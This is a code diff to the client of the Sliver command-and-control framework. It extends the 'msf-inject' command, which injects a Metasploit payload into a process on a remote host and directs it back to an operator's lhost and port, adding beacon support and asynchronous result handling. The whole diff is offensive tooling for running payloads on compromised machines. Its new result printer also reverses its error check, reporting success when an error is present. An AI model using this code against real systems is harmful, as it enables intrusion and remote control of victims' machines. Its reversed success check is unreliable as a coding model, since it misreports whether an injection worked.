@@ -25,14 +25,16 @@ import (
 	"github.com/bishopfox/sliver/client/console"
 	consts "github.com/bishopfox/sliver/client/constants"
 	"github.com/bishopfox/sliver/protobuf/clientpb"
+	"github.com/bishopfox/sliver/protobuf/sliverpb"
+	"google.golang.org/protobuf/proto"
 
 	"github.com/desertbit/grumble"
 )
 
 // MsfInjectCmd - Inject a metasploit payload into a remote process
 func MsfInjectCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
-	session := con.ActiveSession.GetInteractive()
-	if session == nil {
+	session, beacon := con.ActiveTarget.GetInteractive()
+	if session == nil && beacon == nil {
 		return
 	}
 
@@ -47,18 +49,26 @@ func MsfInjectCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
 		con.PrintErrorf("Invalid lhost '%s', see `help %s`\n", lhost, consts.MsfInjectStr)
 		return
 	}
-
 	if pid == -1 {
 		con.PrintErrorf("Invalid pid '%s', see `help %s`\n", lhost, consts.MsfInjectStr)
 		return
 	}
+	var goos string
+	var goarch string
+	if session != nil {
+		goos = session.OS
+		goarch = session.Arch
+	} else {
+		goos = beacon.OS
+		goarch = beacon.Arch
+	}
 
 	ctrl := make(chan bool)
-	msg := fmt.Sprintf("Injecting payload %s %s/%s -> %s:%d ...",
-		payloadName, session.OS, session.Arch, lhost, lport)
+	msg := fmt.Sprintf("Sending msf payload %s %s/%s -> %s:%d ...",
+		payloadName, goos, goarch, lhost, lport)
 	con.SpinUntil(msg, ctrl)
-	_, err := con.Rpc.MsfRemote(context.Background(), &clientpb.MSFRemoteReq{
-		Request:    con.ActiveSession.Request(ctx),
+	msfTask, err := con.Rpc.MsfRemote(context.Background(), &clientpb.MSFRemoteReq{
+		Request:    con.ActiveTarget.Request(ctx),
 		Payload:    payloadName,
 		LHost:      lhost,
 		LPort:      uint32(lport),
@@ -70,7 +80,33 @@ func MsfInjectCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
 	<-ctrl
 	if err != nil {
 		con.PrintErrorf("%s\n", err)
+		return
+	}
+
+	if msfTask.Response != nil && msfTask.Response.Async {
+		con.AddBeaconCallback(msfTask.Response.TaskID, func(task *clientpb.BeaconTask) {
+			err = proto.Unmarshal(task.Response, msfTask)
+			if err != nil {
+				con.PrintErrorf("Failed to decode response %s\n", err)
+				return
+			}
+			PrintMsfRemote(msfTask, con)
+		})
+		con.PrintAsyncResponse(msfTask.Response)
 	} else {
-		con.PrintInfof("Executed payload on target\n")
+		PrintMsfRemote(msfTask, con)
+	}
+}
+
+// PrintMsfRemote - Print the results of the remote injection attempt
+func PrintMsfRemote(msfRemote *sliverpb.Task, con *console.SliverConsoleClient) {
+	if msfRemote.Response == nil {
+		con.PrintErrorf("Empty response from msf payload injection task")
+		return
+	}
+	if msfRemote.Response.Err != "" {
+		con.PrintInfof("Executed payload on target")
+	} else {
+		con.PrintErrorf("Failed to inject payload: %s", msfRemote.Response.Err)
 	}
 }
